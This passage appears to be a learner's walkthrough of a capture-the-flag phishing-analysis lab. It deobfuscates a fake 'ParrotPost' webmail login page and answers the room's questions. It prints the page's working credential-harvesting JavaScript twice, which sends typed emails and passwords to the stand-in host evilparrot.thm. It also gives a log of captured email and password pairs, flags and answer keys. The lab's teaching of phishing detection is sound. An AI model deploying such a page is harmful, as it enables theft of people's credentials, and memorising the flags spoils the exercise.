d;}button{border-top-width:medium;}input[type=password]{border-bottom-style:solid;}button{border-left-style:none;}input[type=password]{border-right-style:solid;}input[type=password]{border-top-style:solid;}input[type=password]{border-left-color:#ccc;}input[type=password]{border-bottom-color:#ccc;}input[type=password]{border-right-color:#ccc;}input[type=password]{border-top-color:#ccc;}button{border-bottom-style:none;}button{border-right-style:none;}button{border-top-style:none;}input[type=password]{border-image:none;}button:hover{background-color:#45a049;}button{border-left-color:currentColor;}button{border-bottom-color:currentColor;}label[class~=checkbox]{display:inline-block;}button{border-right-color:currentColor;}label[class~=checkbox]{margin-bottom:.75pc;}button{border-top-color:currentColor;}button{border-image:none;}button{border-radius:3pt;}button{cursor:pointer;}button{width:100%;}</style></head><body><h1>&#80;&#97;&#114;&#114;&#111;&#116;&#80;&#111;&#115;&#116;&#32;&#83;&#101;&#99;&#117;&#114;&#101;&#32;&#87;&#101;&#98;&#109;&#97;&#105;&#108;&#32;&#76;&#111;&#103;&#105;&#110;</h1><form id="&#108;&#111;&#103;&#105;&#110;&#45;&#102;&#111;&#114;&#109;"><label for="&#101;&#109;&#97;&#105;&#108;">&#69;&#109;&#97;&#105;&#108;&#58;</label><input type="&#116;&#101;&#120;&#116;" id="&#101;&#109;&#97;&#105;&#108;" name="&#101;&#109;&#97;&#105;&#108;" value="&#112;&#102;&#101;&#97;&#116;&#104;&#101;&#114;&#115;&#64;&#102;&#108;&#121;&#105;&#110;&#103;&#45;&#115;&#101;&#99;&#46;&#116;&#104;&#109;" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#97;&#100;&#100;&#114;&#101;&#115;&#115;"><label for="&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;">&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#58;</label><input type="&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" id="&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" name="&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;"><button type="&#115;&#117;&#98;&#109;&#105;&#116;" id="&#108;&#111;&#103;&#105;&#110;&#45;&#98;&#117;&#116;&#116;&#111;&#110;">&#76;&#111;&#103;&#105;&#110;</button><div class="&#102;&#111;&#114;&#103;&#111;&#116;&#45;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;"><a href="&#35;">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#63;</a></div><!-- VEhNe2QwdWJsM18zbmMwZDNkfQo= --></form><script>const form=document.getElementById("login-form");const loginButton=document.getElementById("login-button");let errorMessage=null;form.addEventListener("submit",(event)=>{/*prevent the form from submitting normally*/event.preventDefault();/*get the username and password input values and set them to variables*/const email=document.getElementById("email").value;const password=document.getElementById("password").value;/*create a new HTTP request object for our evil server*/const xhr=new XMLHttpRequest();/*encode the email and password using encodeURIComponent*/const encodedEmail=encodeURIComponent(email);const encodedPassword=encodeURIComponent(password);/*add the encoded email and password as query parameters in the GET request*/const url=`http://evilparrot.thm:8080/cred-capture.php?email=${encodedEmail}&password=${encodedPassword}`;xhr.open("GET",url,true);/*send the GET request to the evil server*/xhr.send();if(errorMessage){errorMessage.innerHTML="Sorry, there was an error processing your request. Please try again later.";}else{errorMessage=document.createElement("div");errorMessage.innerHTML="Sorry, there was an error processing your request. Please try again later.";errorMessage.style.color="red";eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3.2.1="0";',4,4,'12px|fontSize|style|errorMessage'.split('|'),0,{}))
form.insertBefore(errorMessage,loginButton.nextSibling);}});/*redirect to the REAL PostParrot website after sending, so the victim doesn't get suspicious! //window.location.href = "https://www.postparrot.thm";*/</script></body></html>

<!-- VEhNe2QwdWJsM18zbmMwZDNkfQo= -->

THM{d0ubl3_3nc0d3d}
```

What encoding scheme is used to obfuscate the web page contents?  

*base64*

What is the built-in JavaScript function used to decode the web page before writing it to the page?  

*atob()*

After the initial base64 decoding, what is the value of the leftover base64 encoded comment?  

*THM{d0ubl3_3nc0d3d}*

### Task 5  HTML Obfuscation

HTML Entity Decoding

Analyzing our "decoded_webpage.html" file is a little daunting as this file isn't made to be human-readable. This is because it's been compressed into a minified form, which means that all unnecessary characters, such as spaces, line breaks, and some comments, have been removed to reduce the file size. Minified code is often used in web development to reduce the loading time of web pages since smaller files can be loaded faster. However, it can make the code harder to read and understand for humans.

We will work on making the code more human-readable shortly, but first, there appears to still be some encoding in the HTML. If you locate the `<h1>` tag, you will notice a long string of seemingly random characters followed by semicolons. Ex: `<h1>&#80;&#97;&#114;&#114;&#111;&#116;`

This is known as **HTML Entity Encoding** and is another trick that the author of this file is using to throw us off. HTML entities are special sequences of characters used to represent reserved characters and other special characters in HTML. Fortunately, CyberChef can handle the decoding process of HTML Entity characters.

Copy everything from the opening `<h1>` tag to the closing `</form>` tag and paste it into the **Input** field of CyberChef. From there, search for "HTML Entity" in the **Operations** search bar and drag the **From HTML Entity** into the **Recipe** pane.

![CyberChef dashboard, HTML entity decoding the string from the HTM attachment file.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/557e5fc2e65fcf541fd4854daa9e1a41.png)  

_Tip: Make sure you click **Clear Recipe** (trashcan icon) before this step so you do not attempt to base64 decode again as well!  
_

Great! Now we can copy the **Output** contents and paste them into the "decoded_webpage.html" file in place of all the HTML Entity characters we originally copied. This is also an excellent time to add line breaks to clarify what we've decoded. Your file should look something like this:

![SublimeText indicating the current status of the HTML file, after the above actions have been performed.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/81a9cb2ae974b3b2e58ae3a7b37d02e5.png)  

It is still unclear, but we can make out the HTML elements now. Looking into it more, it is a login page. Some input elements prompt the user for an email and password, with a login submit button.

Answer the questions below

```
<h1>ParrotPost Secure Webmail Login</h1><form id="login-form"><label for="email">Email:</label><input type="text" id="email" name="email" value="pfeathers@flying-sec.thm" placeholder="Enter your email address"><label for="password">Password:</label><input type="password" id="password" name="password" placeholder="Enter your password"><button type="submit" id="login-button">Login</button><div class="forgot-password"><a href="#">Forgot Password?</a></div><!-- VEhNe2QwdWJsM18zbmMwZDNkfQo= --></form>
```

	After decoding the HTML Entity characters, what is the text inside of the <h1> tag?  

*ParrotPost Secure Webmail Login*

### Task 6  CSS Obfuscation

CSS (Cascading Style Sheets) is a web language used for declaring the visual design of a web page written in HTML. CSS allows web developers to separate the presentation of a document from its content, making it easier to create and maintain visually appealing web pages. CSS can also be embedded directly into an existing HTML document using the `<style>` element.

In our file, the CSS stylesheet makes up a good portion at the beginning of the document and is contained within the opening `<style>` and closing `</style>` tags. The CSS has also gone through a **Minifier** to remove unnecessary whitespace, comments, and other characters that are not needed for the browser to interpret and display the styles correctly. If we wanted to understand the stylesheet more, we could copy and paste it into a **CSS Beautify** tool to make it more readable. [CyberChef](https://gchq.github.io/CyberChef/) can perform CSS Beautify and CSS Minify operations. However, another good example is [https://www.cleancss.com/css-beautify/](https://www.cleancss.com/css-beautify/).

![Graphic diagram displaying the difference between CSS before and after modification.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/81f1222e7a0b8c3cc3f60dca365d71db.png)  

The stylesheet has been run through a **CSS Obfuscator** tool. Like a minimizer, a CSS obfuscator transforms the CSS code to make it difficult to read and understand without affecting its functionality. It is typically used to protect the intellectual property of the code, making it difficult for others to copy, modify or reverse-engineer it.

Often, in the case of phishing and credential capture webpages, attackers will directly copy the CSS stylesheets from known trusted websites (think of the Google or Microsoft sign-in page). By obfuscating the copied stylesheets, it makes it harder for antivirus engines and sandboxing agents to detect the stolen stylesheet.  

This section was covered for the sake of thoroughness. However, we can effectively ignore everything before the closing `</style>` tag and add some line breaks to separate things visually.

Answer the questions below

What is the reverse of CSS Minify?

```
https://www.cleancss.com/css-beautify/

<style>body{
    font-family:Arial,sans-serif;
}
input[type=password],input[type=text]{
    width:100%;
}
body{
    background-color:#f2f2f2;
}
h1,[class~=forgot-password]{
    text-align:center;
}
form,input[type=password],button,input[type=text]{
    padding-left:.208333333in;
}
h1{
    margin-top:.520833333in;
}
form{
    background-color:#fff;
}
input[type=text],input[type=password]{
    padding-bottom:9pt;
}
form,input[type=password],button,input[type=text]{
    padding-right:.208333333in;
}
[class~=forgot-password]{
    margin-top:1.25pc;
}
input[type=text],input[type=password]{
    padding-top:9pt;
}
[class~=forgot-password]{
    font-size:.75pc;
}
input[type=password],input[type=text]{
    margin-left:0;
}
input[type=password],input[type=text]{
    margin-bottom:6pt;
}
input[type=text],input[type=password]{
    margin-right:0;
}
form{
    border-radius:.3125pc;
}
form{
    box-shadow:0 0 7.5pt rgba(0,0,0,.2);
}
input[type=text],input[type=password]{
    margin-top:6pt;
}
input[type=password],input[type=text]{
    display:inline-block;
}
input[type=text]{
    border-left-width:.75pt;
}
form{
    width:18.75pc;
}
form{
    margin-left:auto;
}
input[type=text]{
    border-bottom-width:.75pt;
}
input[type=text]{
    border-right-width:.75pt;
}
form{
    margin-bottom:37.5pt;
}
input[type=text]{
    border-top-width:.75pt;
}
input[type=text]{
    border-left-style:solid;
}
input[type=text]{
    border-bottom-style:solid;
}
input[type=text]{
    border-right-style:solid;
}
input[type=text]{
    border-top-style:solid;
}
form{
    margin-right:auto;
}
input[type=text]{
    border-left-color:#ccc;
}
input[type=text]{
    border-bottom-color:#ccc;
}
input[type=text]{
    border-right-color:#ccc;
}
input[type=text]{
    border-top-color:#ccc;
}
form{
    margin-top:37.5pt;
}
input[type=text]{
    border-image:none;
}
form{
    padding-bottom:15pt;
}
input[type=text],input[type=password]{
    border-radius:.041666667in;
}
form{
    padding-top:15pt;
}
input[type=password],input[type=text]{
    box-sizing:border-box;
}
button{
    background-color:#4caf50;
}
button{
    color:#fff;
}
button{
    padding-bottom:10.5pt;
}
button{
    padding-top:10.5pt;
}
button{
    margin-left:0;
}
button{
    margin-bottom:6pt;
}
button{
    margin-right:0;
}
button{
    margin-top:6pt;
}
button{
    border-left-width:medium;
}
button{
    border-bottom-width:medium;
}
button{
    border-right-width:medium;
}
input[type=password]{
    border-left-width:.75pt;
}
input[type=password]{
    border-bottom-width:.75pt;
}
input[type=password]{
    border-right-width:.75pt;
}
input[type=password]{
    border-top-width:.75pt;
}
input[type=password]{
    border-left-style:solid;
}
button{
    border-top-width:medium;
}
input[type=password]{
    border-bottom-style:solid;
}
button{
    border-left-style:none;
}
input[type=password]{
    border-right-style:solid;
}
input[type=password]{
    border-top-style:solid;
}
input[type=password]{
    border-left-color:#ccc;
}
input[type=password]{
    border-bottom-color:#ccc;
}
input[type=password]{
    border-right-color:#ccc;
}
input[type=password]{
    border-top-color:#ccc;
}
button{
    border-bottom-style:none;
}
button{
    border-right-style:none;
}
button{
    border-top-style:none;
}
input[type=password]{
    border-image:none;
}
button:hover{
    background-color:#45a049;
}
button{
    border-left-color:currentColor;
}
button{
    border-bottom-color:currentColor;
}
label[class~=checkbox]{
    display:inline-block;
}
button{
    border-right-color:currentColor;
}
label[class~=checkbox]{
    margin-bottom:.75pc;
}
button{
    border-top-color:currentColor;
}
button{
    border-image:none;
}
button{
    border-radius:3pt;
}
button{
    cursor:pointer;
}
button{
    width:100%;
}
</style>


```

*CSS Beautify*

### Task 7  JavaScript Obfuscation

So far, we have uncovered that the attached .htm file renders an HTML login form, and an inline stylesheet is used to define the webpage's design. However, where is the login form sending its captured data? And what happens after we submit credentials? To find these answers, we must look at the final piece of this file inside the `<script>` tag.

JavaScript is often used in login forms to perform client-side form validation asynchronously and to send the user's credentials to the server for authentication. As a running theme with this file, there are some hoops we need to jump through first to make it readable.

JavaScript Beautify

This JavaScript code has been minified, removing any unnecessary characters and whitespace. Fortunately, we can "beautify" this code by copying everything between the opening `<script>` and closing `</script>` tags, pasting it into the input of [Beautifier.io](https://beautifier.io/) and clicking **Beautify Code**. Alternatively, we can leverage [CyberChef's](https://gchq.github.io/CyberChef/) "JavaScript Beautify" operation to accomplish the same result.

![The Beautifier.io webpage indicating the output after the JavaScript section has been beautified.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/439dfdb147dca6905ea976ad8d8e2f86.png)

_Click to enlarge the image._

We can then copy and replace the output in our file with the original JavaScript code we copied. Now that we have readable code, the author accidentally left over some verbose comments that help us understand what each statement is doing. Use this and some external JavaScript research to answer the questions below.

Answer the questions below

```
https://beautifier.io/

<script>
    const form = document.getElementById("login-form");
const loginButton = document.getElementById("login-button");
let errorMessage = null;
form.addEventListener("submit", (event) => {
    /*prevent the form from submitting normally*/
    event.preventDefault(); /*get the username and password input values and set them to variables*/
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value; /*create a new HTTP request object for our evil server*/
    const xhr = new XMLHttpRequest(); /*encode the email and password using encodeURIComponent*/
    const encodedEmail = encodeURIComponent(email);
    const encodedPassword = encodeURIComponent(password); /*add the encoded email and password as query parameters in the GET request*/
    const url = `http://evilparrot.thm:8080/cred-capture.php?email=${encodedEmail}&password=${encodedPassword}`;
    xhr.open("GET", url, true); /*send the GET request to the evil server*/
    xhr.send();
    if (errorMessage) {
        errorMessage.innerHTML = "Sorry, there was an error processing your request. Please try again later.";
    } else {
        errorMessage = document.createElement("div");
        errorMessage.innerHTML = "Sorry, there was an error processing your request. Please try again later.";
        errorMessage.style.color = "red";
        errorMessage.style.fontSize = "12px";
        form.insertBefore(errorMessage, loginButton.nextSibling);
    }
}); /*redirect to the REAL PostParrot website after sending, so the victim doesn't get suspicious! //window.location.href = "https://www.postparrot.thm";*/ < /script>
```

What is the URL that receives the login request when the login form is submitted?  

*http://evilparrot.thm:8080/cred-capture.php*

What is the JavaScript property that can redirect the browser to a new URL?

*window.location.href*

### Task 8  Putting It All Together

 Start Machine

Through our investigation, we manually decoded and inferred the true nature of this webpage. To summarize, this is a login page that impersonates the legitimate ParrotPost website to capture user credentials for malicious purposes. The JavaScript code listens for the login form submission event and sends an HTTP GET request to another URL location, which is clearly not the _actual_ ParrotPost login endpoint.

Detonating the Form

Interacting with this malicious webpage isn't something you usually want to do (unless you are in a controlled sandbox environment), but let's demonstrate what happens when a victim falls for this phishing website! This will help us study the behaviour of the document and its potential impact on a real system (and victim) without actually infecting or harming any systems.

First, click **Start Machine** at the top of this task. This will open up the VM in a split-screen browser window. If the VM is not visible, click the blue **Show Split View** button at the top-right of the page. Once you are brought to the desktop, open the original `ParrotPostACTIONREQUIRED.htm` document in the VM's web browser (right-click, and select **Open With Firefox Web Browser**).

![The desktop of attached VM, highlighting the Open with Firefox context menu option.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/a411b94fae8448d345ab786ac80af3ac.png)  

**Note:** For this task, please ensure you are using the VM attached to this task, rather than the AttackBox.

You should be directed to the following HTML page in your browser:

![The rendered phishing webpage in the browser.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/b0bc92ff9bf50bd4fa9dd201880c27a3.png)  

As suspected, this is a credential capture login page, and it appears Paul's email address has already been filled in under the **Email** field. This is a common familiarity tactic to have a victim think a site has remembered or cached their username, helping to create trust. It also reveals that this is likely a targeted phishing campaign, and since Paul is a senior executive, this may specifically be a [Whaling attack](https://www.ncsc.gov.uk/guidance/whaling-how-it-works-and-what-your-organisation-can-do-about-it).

Let's change the value of the **Email** and **Password** fields to represent fake credentials, as this will probably be logged on the attacker's server. Then, click **Login**.

![The error message on the rendered phishing webpage, after entering fake credentials and clicking Login.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/7ee37664331ca72f569b074eab318772.png)  

Upon submitting our phony credentials, the website returns an error message claiming an error processing our login request. However, that might not be the case; this may be a "fake" error message that attackers use to ease suspicion, whereas, in reality, our request containing credentials did go through in the background (through the beauty of asynchronous JavaScript).

Check the Network Requests

By checking the **Network** tab in the browser's **Developer Tools**, we can quickly determine whether submitting the form sent a successful HTTP GET request. To open the Developer Tools menu, right-click on the page and select **Inspect**. Once the tab is open, click on the **Network** tab.

![The browser's Network tab, showing no requests.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/42359006265cf048550e851106e89808.png)  

From here, we only need to click the **Login** button to submit the form again. You should suddenly see a GET request appear!

![The browser's Network tab, showing a GET request to evilparrot.thm](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/5c1e8262a5307b2858e0decef29a3f96.png)  

Our browser successfully established the connection to the `evilparrot.thm` web server and included our credentials as query parameters in the GET request to `/cred-capture.php`.

Clicking on the listed request will give us more details in the right-hand panel. We can navigate between different tabs to view information, such as the request and response headers. The **Response** tab will show any response content, such as the HTML, JSON, or XML response body. Sometimes this can give us more information about how the web server handles the request, depending on how verbose the server-side code is designed.

![The network request's details pane, indicating that the user credentials were sent to the webserver as URL parameters.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/24ad269d388cb9f498b10586e2f33040.png)  

Play around by testing a request and analyzing the response. You may find some interesting information to help answer the questions below.

Answer the questions below

```
https://www.ncsc.gov.uk/guidance/whaling-how-it-works-and-what-your-organisation-can-do-about-it

THM{c4p7ur3d_y0ur_cr3d5} Status: SUCCESS! Credentials have been stolen and appended to http://evilparrot.thm:8080/creds.txt

http://evilparrot.thm:8080/creds.txt

2023-04-25 14:21:51 - Email Address: 'mhoppus72@gmail.com', Password: 'carousel182'
2023-04-26 21:45:32 - Email Address: 'chris.smith@zebramail.com', Password: 'FlyL1ke!A~Bird'
2023-04-27 08:15:21 - Email Address: 'sara.jackson@acme.com', Password: 'H3ll0W0rld!'
2023-04-27 12:30:45 - Email Address: 'mike.wilson@outlook.com', Password: 'P@ssw0rd!'
2023-04-27 18:20:11 - Email Address: 'jessica.parker@googlemail.com', Password: 'qwerty123'
2023-04-28 09:40:23 - Email Address: 'steven.roberts@protonmail.com', Password: '1LoveM3!'
2023-04-28 13:50:17 - Email Address: 'karen.white@icloud.com', Password: 'Pa55word'
2023-04-28 16:10:05 - Email Address: 'brian.douglas@yandex.com', Password: 'secret123'
2023-04-28 20:25:18 - Email Address: 'diane.thompson@yahoo.com', Password: '12345678'
2023-04-29 09:30:09 - Email Address: 'william.clark@aol.com', Password: 'H3ll0P@ss'
2023-04-29 13:15:56 - Email Address: 'laura.brown@inbox.com', Password: 'P@ssword123'
2023-04-29 15:30:40 - Email Address: 'peter.davies@live.com', Password: 'letmein1'
2023-04-29 18:50:08 - Email Address: 'katie.foster@rediffmail.com', Password: 'd0glover!'
2023-04-29 20:15:23 - Email Address: 'adam.miller@mail.com', Password: 'mysecret11'
2023-08-08 01:21:55 - Email Address: 'test@test.com', Password: 'test'
2023-08-08 01:23:08 - Email Address: 'test@test.com', Password: 'test'


```
![[Pasted image 20230807202545.png]]

What is the flag you receive after sending fake credentials to the /cred-capture.php endpoint?  

*THM{c4p7ur3d_y0ur_cr3d5}*

What is the path on the web server hosting the log of captured credentials?  

*/creds.txt*

Based on the log, what is Chris Smith's password?  

*FlyL1ke!A~Bird*

### Task 9  Conclusion

You should now better understand how to identify and analyze phishing attacks that attempt to steal user credentials. You have learned to use various tools to inspect and analyze suspicious emails and attachments and recognize and decode different obfuscation techniques used in malicious HTML, CSS, and JavaScript code.

Remember, the analysis doesn't end here; it's always a good idea to report malicious domains and IP addresses to help protect yourself and others from future attacks. Domain registrars typically have a Registrar Abuse Contact, which can be found by performing a [WhoIs](https://www.whois.com/whois/) lookup of the malicious domain. Malicious IPs can be reported through the appropriate Internet Service Provider (ISP) or hosting provider.

Answer the questions below

```
https://www.whois.com/whois/evilparrot.com

not taken Registrar Abuse Contact Email: abuse@NameBright.com
```

Walkthrough complete!  

 Completed



[[OWASP Broken Access Control]]